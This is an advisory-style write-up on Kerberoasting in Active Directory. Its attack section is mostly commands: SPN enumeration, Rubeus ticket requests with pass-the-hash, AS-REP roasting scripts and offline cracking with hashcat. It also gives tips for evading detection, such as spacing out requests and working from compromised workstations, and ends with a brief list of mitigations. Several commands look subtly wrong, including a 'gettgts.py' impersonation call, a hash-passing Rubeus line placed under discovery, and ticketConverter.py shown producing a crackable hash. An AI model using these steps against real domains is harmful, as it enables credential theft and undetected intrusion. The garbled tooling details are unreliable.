# Active Directory Kerberoasting in Modern Environments

**Date:** 2024-08-22
**Severity:** Medium-High
**Affected:** Windows Active Directory environments with service accounts

## Summary

Detailed analysis of Kerberoasting attack techniques in modern Active Directory environments, including mitigation bypasses and detection evasion methods.

## Background

Kerberoasting is a technique where an attacker requests service tickets (TGS) for service accounts and then cracks them offline. In modern environments, this has evolved with new attack vectors.

## Attack Flow

### Phase 1: Service Account Discovery

```powershell
# Enumerate service accounts with SPNs
Get-ADUser -Filter {servicePrincipalName -ne "$null"} -Properties servicePrincipalName

# Alternative: Use Rubeus
.\Rubeus.exe asktgt /user:admin /rc4:<hash> /ptt
.\Rubeus.exe kerberoast
```

### Phase 2: Ticket Request

```bash
# Request TGS ticket for target service
gettgts.py domain.com/user -hashes :<ntlm> -impersonate target_user
```

### Phase 3: Offline Cracking

```bash
# Extract ticket and crack
ticketConverter.py ticket.kirbi ticket.hash
hashcat -m 13100 ticket.hash rockyou.txt
```

## Modern Variations

### AS-REP Roasting Hybrid

Combine AS-REP roasting with Kerberoasting for maximum coverage:

```powershell
# Find accounts without pre-auth
Get-ADUser -Filter {msDS-UserAccountControlComputed -band 4194304}

# Roast both AS-REP and TGS tickets
.\ASREPRoast.ps1 -Domain domain.com -Output asrep_hashes.txt
.\Kerberoast.ps1 -Domain domain.com -Output tgs_hashes.txt
```

### Golden SAML Integration

In hybrid environments, combine with Golden SAML attacks for cloud access.

## Detection Evasion

### Timing-Based

- Request tickets during business hours
- Space out requests to avoid spikes
- Mimic normal user behavior patterns

### Source-Based

- Use compromised legitimate workstations
- Avoid new or unusual source IPs
- Leverage existing service account patterns

## Mitigation Strategies

1. **Strong Passwords:** Use 25+ character passwords for service accounts
2. **gMSA:** Use Group Managed Service Accounts where possible
3. **Monitoring:** Alert on unusual TGS request patterns
4. **Least Privilege:** Limit service account permissions

## Tools

- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Impacket](https://github.com/fortra/impacket)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)